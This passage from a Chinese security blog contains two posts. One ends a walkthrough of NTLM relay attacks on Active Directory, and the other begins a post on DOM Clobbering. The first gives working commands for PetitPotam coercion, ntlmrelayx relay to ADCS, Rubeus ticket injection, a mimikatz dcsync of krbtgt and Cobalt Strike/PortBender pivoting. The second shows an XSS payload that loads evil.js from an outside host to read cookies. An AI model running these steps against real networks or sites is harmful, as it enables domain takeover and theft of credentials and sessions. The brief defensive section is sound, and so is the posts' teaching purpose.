<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 开启代理</span><br><span class="line">socks 1080</span><br><span class="line"></span><br><span class="line"># 配置代理/etc/proxychains4.conf</span><br><span class="line">socks4 10.10.20.24 1080</span><br><span class="line"></span><br><span class="line"># 中继攻击监听</span><br><span class="line">proxychains python3 ntlmrelayx.py -t smb://10.10.10.18 -smb2support</span><br></pre></td></tr></table></figure>

<p>​    当受控主机的<code>445</code>端口收到身份认证的流量之后，将会将流量传送到监听的远程攻击主机上，收到<code>Net-NTLM Hash</code>之后，通过<code>socks</code>代理，就可以中继到内网的其他主机。</p>
<p>​    这里顺便提一下，就是此时域内主机主动连接该445端口，是不会进行认证的。（域内主机发送了一个询问流量之后，不会收到来自该主机的响应）因此，单纯利用这种方式被动的等待比较鸡肋。在这种情况下并不是进行被动收集<code>Net-NTLM Hash</code>，而是通过主动攻击的方式，利用一些漏洞，比如打印机漏洞，还有最近比较火的<code>PetitPotam</code>，主动向该端口发送<code>Net-NTLM Hash</code>。</p>
<h4 id="利用PetitPotam中继ADCS接管域"><a href="#利用PetitPotam中继ADCS接管域" class="headerlink" title="利用PetitPotam中继ADCS接管域"></a>利用<code>PetitPotam</code>中继<code>ADCS</code>接管域</h4><p>​    由于<code>NTLM Relay</code>不能够中继自己，所以利用这种方式进行攻击，更像是一种提权手段，在已知域内一台主机账号密码的情况下，可以让他向<code>CS</code>发送<code>NTLM</code>请求，获取一个证书。</p>
<p>​    最近内网攻防比较火的一种攻击方式，利用<code>PetitPotam</code>，强制域内主机发起<code>NTLM Hash</code>，中继到<code>ADCS</code>获取证书，从中提取<code>TGT</code>，利用票据传递接管域控。</p>
<p>​    <code>PetitPotam</code>中继攻击，这是一种新型的<code>NTLM Relay</code>攻击利用手法，其利用了微软加密文件系统远程协议。利用该漏洞，攻击者连接到<code>LSARPC</code>后能够强制触发目标机器向指定的远程服务器发送<code>Net-NTLM Hash</code>，在获取到<code>Net-NTLM Hash</code>之后，就能够进行<code>NTLM Relay</code>攻击。</p>
<p>​    而<code>ADCS</code>证书服务器在默认安装之后，由于<code>ADCS</code>的<code>HTTP</code>证书接口（<code>/certsrv/certfnsh.asp </code>）没有启用<code>NTLM</code>中继保护，并且在<code>HTTP</code>请求的时候，<code>Authorization HTTP</code>标头明确指定只允许通过<code>NTLM</code>进行身份验证。因此，配合上面的<code>PetitPotam</code>的方式，强制域控向该接口发送<code>Net-NTLM Hash</code>，从而可以获取到一个域内的证书，从中提取<code>TGT</code>，利用票据传递接管域控。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125132241179.png" alt="image-20211125132241179"></p>
<p>​    在内网环境中，如果存在两个域控（一个主域控，一个辅助域控），都安装了<code>ADCS</code>证书服务的话，可以导出<code>TGT</code>，从而接管域控：（实验拓扑图）</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125165454471.png" alt="image-20211125165454471"></p>
<p>​    由于在<code>win2008</code>和<code>win2012</code>环境下，通过<code>PetitPotam</code>强制域控发起<code>Net-NTLM Hash</code>可以以匿名的方式，也就是说不需要知道账号密码也可发送。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PetitPotam.py -d de1ay 10.10.10.25 10.10.10.99</span><br></pre></td></tr></table></figure>

<p>​    强制辅助域控（10.10.10.99）向本机（10.10.10.25）的445端口发送<code>Net-NTLM Hash</code>，然后在本地主机上捕获到<code>Net-NTLM Hash</code>之后，发起中继攻击，中继到域控主机（10.10.10.10）的<code>ADCS</code>服务上申请一个证书：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125165436605.png" alt="image-20211125165436605"></p>
<p>​    申请到证书之后，就可以通过<code>Rubeus</code>攻击从中提取出来<code>TGT</code>，转而接管域控：（这里假设<code>Win7</code>客户机已经被拿下，接下来操作在<code>Win7</code>上进行即可）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:username /certificate:证书的base64值 /ptt</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125165751781.png" alt="image-20211125165751781"></p>
<p>​    通过<code>mimikatz</code>可以查看<code>kerberos</code>票据信息：<code>kerberos::list</code>，导出<code>krbtgt</code>的哈希值：<code>lsadump::dcsync /user:krbtgt /csv</code></p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125170536240.png" alt="image-20211125170536240"></p>
<p>​    而现实的网络拓扑环境可能是这个样子：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125173645507.png" alt="image-20211125173645507"></p>
<p>​    所有的流量都通过<code>Win7</code>客户机发送给内网主机。<code>Win7</code>客户机的445端口被占用，此时想要通过同样的方式，攻击域控的<code>ADCS</code>可以使用<code>PortBender</code>将<code>TCP</code>流量重定向。</p>
<p>​    具体攻击思路是将<code>Win7</code>上面的<code>445</code>端口流量重定向之后，<code>TeamServer</code>通过远程流量转发的方式，传回攻击者监听的445端口。攻击者开启<code>socks</code>代理，将流量传送到域控的80端口，请求获取一个证书。</p>
<p>​    我这里利用<code>Cobalt Strick</code>，拿到<code>Win7</code>客户机的一个<code>System</code>权限的<code>Beacon</code>后，开启一个<code>socks</code>代理：<code>socks 1080</code>，然后远程转发端口流量，将<code>8445</code>的流量全部转发到攻击者的<code>445</code>端口：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125180619684.png" alt="image-20211125180619684"></p>
<p>​    之后上传<code>WinDivert32.sys</code>（我这里<code>Win7</code>是32位的），执行<code>PortBender  redirect 445 8445</code>，将<code>Win7</code>上的<code>445</code>端口流量全部转发到8445端口。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125180945149.png" alt="image-20211125180945149"></p>
<p>​    攻击机配置完代理之后，在攻击机上面开启攻击<code>ADCS</code>的脚本并监听来自445端口的流量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125181138847.png" alt="image-20211125181138847"></p>
<p>​    然后通过代理的方式，利用<code>PetitPotm</code>向辅助域控发送流量，强制其发送<code>Net-NTLM Hash</code>给<code>Win7</code>的445端口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 PetitPotam.py -d de1ay 10.10.10.201 10.10.10.99</span><br></pre></td></tr></table></figure>

<p>​    <img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125181339132.png" alt="image-20211125181339132"></p>
<p> 由于网络问题，多发几次包之后，就可以获取到证书信息：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125181422207.png" alt="image-20211125181422207"></p>
<h2 id="中继攻击防御措施"><a href="#中继攻击防御措施" class="headerlink" title="中继攻击防御措施"></a>中继攻击防御措施</h2><p>1、开启签名保护 </p>
<p>​     默认只有域控是开启了<code>SMB</code>签名，⽽<code>LDAP</code>签名默认策略是协商签名，也就是说是否签名是由客户端决定的。</p>
<p>2、<code>EAP</code>（<code>Enhanced Protection Authentication</code>）：</p>
<p>   <code>NTLM</code>认证和⼀个安全通道进⾏绑定，在 <code>NTLM</code> 认证过程中，最后的<code> NTLM</code>认证数据报⽂包含⼀个⽬标应⽤服务器的证书摘要，这个摘要使⽤客户端的 <code>NTLM</code> 值进⾏签名保护，可以防⽌伪造证书的攻击。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    <code>NTLM Relay</code>是一种中间人攻击的方式，一般而言都是被动攻击，等待连接操作，但<code>PetitPotam</code>的出现，发生了一些改变。正如上面实验，在两台域控都安装了<code>ADCS</code>的情况下，不需要被动等待即可发起攻击。</p>
<p>参考文章：</p>
<p>【委派攻击】<a target="_blank" rel="noopener" href="https://www.bugbank.cn/live/view.html?id=114136">https://www.bugbank.cn/live/view.html?id=114136</a></p>
<p>【利用<code>kerberos</code>身份验证中继攻击】<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html">https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html</a></p>
<p>【中继的实战打法】<a target="_blank" rel="noopener" href="https://rastamouse.me/ntlm-relaying-via-cobalt-strike/">https://rastamouse.me/ntlm-relaying-via-cobalt-strike/</a></p>
<p>【证书服务器攻击与防御】<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/245791#h2-11">https://www.anquanke.com/post/id/245791#h2-11</a></p>
<p>【<code>ExchangeRelayx</code>】<a target="_blank" rel="noopener" href="https://www.freebuf.com/news/184594.html">https://www.freebuf.com/news/184594.html</a></p>
<p>【<code>Portbender</code>端口复用】<a target="_blank" rel="noopener" href="http://cn-sec.com/archives/437340.html">http://cn-sec.com/archives/437340.html</a></p>
<p>【利用<code>PetitPotam</code>进行<code>NTLM Relay</code>攻击】<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/120368697">https://blog.csdn.net/qq_36119192/article/details/120368697</a></p>
<p>【无需<code>Linux</code>进行<code>NTLM Relay</code>】<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1896216">https://cloud.tencent.com/developer/article/1896216</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/12/15/%E6%B5%85%E6%9E%90%E5%9F%9F%E5%86%85NTLM%20Relay%E6%94%BB%E5%87%BB/" data-id="cl8h2kvx5000ehqdphx6f8am3" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-前端安全---Dom Clobbering" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/" class="article-date">
  <time datetime="2021-12-15T08:49:02.000Z" itemprop="datePublished">2021-12-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/">前端安全---Dom Clobbering</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前端安全—Dom-Clobbering"><a href="#前端安全—Dom-Clobbering" class="headerlink" title="前端安全—Dom Clobbering"></a>前端安全—Dom Clobbering</h1><p>首先给出几个关键点：</p>
<p>1、<code>HTML</code>设定<code>id</code>之后，可以在<code>JS</code>中直接使用<code>window.id</code>来使用，或者直接使用<code>id</code>，<code>JS</code>会根据作用域规则，如果当前作用域没有就会向上寻找。</p>
<p>2、官方文档给出，除了<code>id</code>以外，<code>embed</code>、<code>form</code>、<code>img</code>、<code>object</code>这四个标签的<code>name</code>也具有同样特性。</p>
<p>3、在<code>HTML</code>元素利用，有两个特殊标签<code>&lt;area&gt;</code>和<code>&lt;a&gt;</code>，在进行<code>toString</code>方法的时候，会返回其<code>href</code>属性的值。</p>
<p><code>HTML</code>元素列表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html = [&quot;a&quot;,&quot;abbr&quot;,&quot;acronym&quot;,&quot;address&quot;,&quot;applet&quot;,&quot;area&quot;,&quot;article&quot;,&quot;aside&quot;,&quot;audio&quot;,&quot;b&quot;,&quot;base&quot;,&quot;basefont&quot;,&quot;bdi&quot;,&quot;bdo&quot;,&quot;bgsound&quot;,&quot;big&quot;,&quot;blink&quot;,&quot;blockquote&quot;,&quot;body&quot;,&quot;br&quot;,&quot;button&quot;,&quot;canvas&quot;,&quot;caption&quot;,&quot;center&quot;,&quot;cite&quot;,&quot;code&quot;,&quot;col&quot;,&quot;colgroup&quot;,&quot;command&quot;,&quot;content&quot;,&quot;data&quot;,&quot;datalist&quot;,&quot;dd&quot;,&quot;del&quot;,&quot;details&quot;,&quot;dfn&quot;,&quot;dialog&quot;,&quot;dir&quot;,&quot;div&quot;,&quot;dl&quot;,&quot;dt&quot;,&quot;element&quot;,&quot;em&quot;,&quot;embed&quot;,&quot;fieldset&quot;,&quot;figcaption&quot;,&quot;figure&quot;,&quot;font&quot;,&quot;footer&quot;,&quot;form&quot;,&quot;frame&quot;,&quot;frameset&quot;,&quot;h1&quot;,&quot;head&quot;,&quot;header&quot;,&quot;hgroup&quot;,&quot;hr&quot;,&quot;html&quot;,&quot;i&quot;,&quot;iframe&quot;,&quot;image&quot;,&quot;img&quot;,&quot;input&quot;,&quot;ins&quot;,&quot;isindex&quot;,&quot;kbd&quot;,&quot;keygen&quot;,&quot;label&quot;,&quot;legend&quot;,&quot;li&quot;,&quot;link&quot;,&quot;listing&quot;,&quot;main&quot;,&quot;map&quot;,&quot;mark&quot;,&quot;marquee&quot;,&quot;menu&quot;,&quot;menuitem&quot;,&quot;meta&quot;,&quot;meter&quot;,&quot;multicol&quot;,&quot;nav&quot;,&quot;nextid&quot;,&quot;nobr&quot;,&quot;noembed&quot;,&quot;noframes&quot;,&quot;noscript&quot;,&quot;object&quot;,&quot;ol&quot;,&quot;optgroup&quot;,&quot;option&quot;,&quot;output&quot;,&quot;p&quot;,&quot;param&quot;,&quot;picture&quot;,&quot;plaintext&quot;,&quot;pre&quot;,&quot;progress&quot;,&quot;q&quot;,&quot;rb&quot;,&quot;rp&quot;,&quot;rt&quot;,&quot;rtc&quot;,&quot;ruby&quot;,&quot;s&quot;,&quot;samp&quot;,&quot;script&quot;,&quot;section&quot;,&quot;select&quot;,&quot;shadow&quot;,&quot;slot&quot;,&quot;small&quot;,&quot;source&quot;,&quot;spacer&quot;,&quot;span&quot;,&quot;strike&quot;,&quot;strong&quot;,&quot;style&quot;,&quot;sub&quot;,&quot;summary&quot;,&quot;sup&quot;,&quot;svg&quot;,&quot;table&quot;,&quot;tbody&quot;,&quot;td&quot;,&quot;template&quot;,&quot;textarea&quot;,&quot;tfoot&quot;,&quot;th&quot;,&quot;thead&quot;,&quot;time&quot;,&quot;title&quot;,&quot;tr&quot;,&quot;track&quot;,&quot;tt&quot;,&quot;u&quot;,&quot;ul&quot;,&quot;var&quot;,&quot;video&quot;,&quot;wbr&quot;,&quot;xmp&quot;]</span><br></pre></td></tr></table></figure>

<h2 id="Dom-Clobbering介绍"><a href="#Dom-Clobbering介绍" class="headerlink" title="Dom Clobbering介绍"></a><code>Dom Clobbering</code>介绍</h2><p>​    修改<code>HTML</code>元素，来影响<code>JavaScript</code>代码行为。</p>
<p>​    依次来解释一下上面给出的三个关键点：</p>
<h3 id="id属性值的影响"><a href="#id属性值的影响" class="headerlink" title="id属性值的影响"></a><code>id</code>属性值的影响</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 给出一个示例代码</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 id=&quot;m1sn0w&quot;&gt;hello world&lt;/h1&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        console.log(m1sn0w);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>浏览器控制台会输出<code>&lt;h1 id=&quot;m1sn0w&quot;&gt;hello world&lt;/h1&gt;</code>，这也就说明，一个<code>HTML</code>标签的<code>id</code>属性值，会影响到<code>JS</code>中的变量。</p>
<h3 id="特殊标签的name属性"><a href="#特殊标签的name属性" class="headerlink" title="特殊标签的name属性"></a>特殊标签的<code>name</code>属性</h3><p>前面提到过<code>embed</code>、<code>form</code>、<code>img</code>、<code>object</code>这四个特殊标签，除了上面所说的，<code>id</code>属性值会影响<code>JS</code>中的变量外，这四个特殊标签的<code>name</code>属性值，也可以影响<code>JS</code>中相应的变量值，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 id=&quot;m1sn0w&quot;&gt;hello world&lt;/h1&gt;</span><br><span class="line">    &lt;embed name=&quot;m1sn0w1&quot;/&gt;</span><br><span class="line">    &lt;form name=&quot;m1sn0w2&quot; &gt;&lt;/form&gt;</span><br><span class="line">    &lt;img name=&quot;m1sn0w3&quot; /&gt;</span><br><span class="line">    &lt;object name=&quot;m1sn0w4&quot; &gt;</span><br><span class="line">    </span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        console.log(m1sn0w);</span><br><span class="line">        console.log(m1sn0w1);</span><br><span class="line">        console.log(m1sn0w2);</span><br><span class="line">        console.log(m1sn0w3);</span><br><span class="line">        console.log(m1sn0w4);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213103326840.png" alt="image-20211213103326840"></p>
<p>通过控制上面的元素属性，可以用来覆盖掉<code>JS</code>中的变量，从而影响<code>JS</code>的行为。</p>
<p>HTML 的说明文档也有相关明确定义， <a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=YDLzgWf9G18UTnLYorqEZw==.aWeo4An6XZqgX3J7IXNQDROvyBeoBXoL7R1VbRdKDXmycZpSWhuZrvRmLUC3zInFZ6ZMnmwTw9TkdKi8zpNlm0QuAL6oxSxRAI+pyk9gYpew+LdPumy0T2rzmm9pUHjs">7.3.3 Named access on the Window object</a>：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213102011824.png" alt="image-20211213102011824"></p>
<h3 id="toString方法的特殊返回值"><a href="#toString方法的特殊返回值" class="headerlink" title="toString方法的特殊返回值"></a><code>toString</code>方法的特殊返回值</h3><p>​    前面说到，<code>id</code>属性值可以影响<code>JS</code>的相应变量值，当在<code>JS</code>中，将一个标签对象当成字符串处理的时候，会调用这个对象的<code>toString</code>方法。在<code>HTML</code>标签元素中，存在两个特殊的标签，即<code>&lt;a&gt;</code>和<code>&lt;area&gt;</code>标签。当在<code>JS</code>中调用这两个标签元素对应对象的<code>toString</code>方法的时候，会返回其<code>href</code>属性值。例如：<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=bdY1PO9eKAnrYh2v2DWpLw==.1IUJb2XkEQ2CEg2pLRmr79SdM1MxeV2T86bS174SeGTycKdQojvKG6D5RhUfkQUI9uE5HVQ13jzmIF2+YrghAQ==">4.6.3 API for a and area elements</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;a id=&quot;m1sn0w&quot; href=&quot;http://www.baidu.com/&quot;&gt;</span><br><span class="line">    &lt;area id=&quot;m1sn0w1&quot; href=&quot;http://www.m1sn0w.top&quot; &gt;</span><br><span class="line">    </span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        console.log(m1sn0w + &#x27;&#x27;);</span><br><span class="line">        console.log(m1sn0w1 + &#x27;&#x27;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213104520034.png" alt="image-20211213104520034"></p>
<p>​    除此之外，<code>base</code>标签也可以和<code>a</code>标签组合使用，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;base href=&quot;file://ftp/&quot;&gt;</span><br><span class="line">    &lt;a id=&quot;m1sn0w&quot; href=&quot;aaa&quot;&gt;</span><br><span class="line">&lt;/base&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    console.log(m1sn0w + &quot;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>​    结果会输出<code>file://ftp/aaa</code>，也就是，可以在<code>base</code>的<code>href</code>上设置协议以及路径，然后在<code>a</code>标签中设置字符串，返回的结果就会进行一个拼接。</p>
<h2 id="DOM-Clobbering攻击"><a href="#DOM-Clobbering攻击" class="headerlink" title="DOM Clobbering攻击"></a><code>DOM Clobbering</code>攻击</h2><h3 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h3><p><code>DOM Clobbering</code>的攻击场景，是需要存在一个输入的地方，将用户输入的标签字符串能转换成<code>HTML</code>标签。（其实也就是<code>XSS</code>）</p>
<p>假设有这样一个示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># index.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        echo $_GET[&#x27;code&#x27;];</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    if (m1sn0w) &#123;</span><br><span class="line">      var script = document.createElement(&#x27;script&#x27;)</span><br><span class="line">      script.src = value</span><br><span class="line">      document.body.appendChild(script)</span><br><span class="line">    &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>除了直接进行<code>XSS</code>攻击之外，还可以通过覆盖<code>JS</code>变量值来进行攻击。</p>
<p>首先传入以下这个字符串，看看页面会发生什么变化：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=&lt;h id=&quot;m1sn0w&quot;&gt;&lt;a id=&quot;value&quot; href=&quot;m1sn0w&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213110834868.png" alt="image-20211213110834868"></p>
<p>​    可以发现前端页面插入了这样一条标签数据。（这里需要注意的就是，在对<code>a</code>和<code>area</code>标签对应对象调用<code>toString</code>方法的时候，<code>href</code>的值需要给出一个<code>URL</code>，如果是字符串的话，默认会添加服务器前缀）</p>
<p>由于<code>script</code>标签是可以跨域进行访问的，如果我在远端服务器上写入一个恶意的<code>JS</code>代码，就可以进行<code>XSS</code>攻击，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 远端写入恶意js代码:http://122.112.137.72/evil.js</span><br><span class="line">alert(document.cookie);</span><br></pre></td></tr></table></figure>

<p>然后传入<code>payload</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=&lt;h id=&quot;m1sn0w&quot;&gt;&lt;a id=&quot;value&quot; href=&quot;http://122.112.137.72/evil.js&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213111701217.png" alt="image-20211213111701217"></p>
<p>​    这里不能直接传入恶意代码，即在<code>value</code>值中写入恶意代码，因为这里不能直接对<code>src</code>中的属性值进行闭合。</p>
<p>​    在实际的业务场景下，例如留言板之类的功能点，由于服务端的一些过滤规则，导致部分标签的数据值会被移除，比如<code>onclick</code>，<code>onerror</code>之类的。在这种情况下，如果不能直接执行<code>JS</code>代码，可以考虑使用<code>DOM Clobbering</code>进行攻击。（因为只需要传入正常的<code>HTML</code>标签，导致变量覆盖就可以进行利用）</p>
<h3 id="多层级变量覆盖"><a href="#多层级变量覆盖" class="headerlink" title="多层级变量覆盖"></a>多层级变量覆盖</h3><p>​    在实际的前端<code>JS</code>代码中，我们可能会遇到这种情况：<code>windows.m1sn0w.log</code>即多层级的变量调用。那么在这种情况下，如何通过修改<code>HTML</code>标签来进行影响呢？</p>
<h4 id="利用HTML层级标签"><a href="#利用HTML层级标签" class="headerlink" title="利用HTML层级标签"></a>利用<code>HTML</code>层级标签</h4><p>​    <code>form</code>标签就具有这种层级关系，可以使用<code>form[name]</code>或者<code>form[id]</code>来调用<code>form</code>标签下的子标签，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta 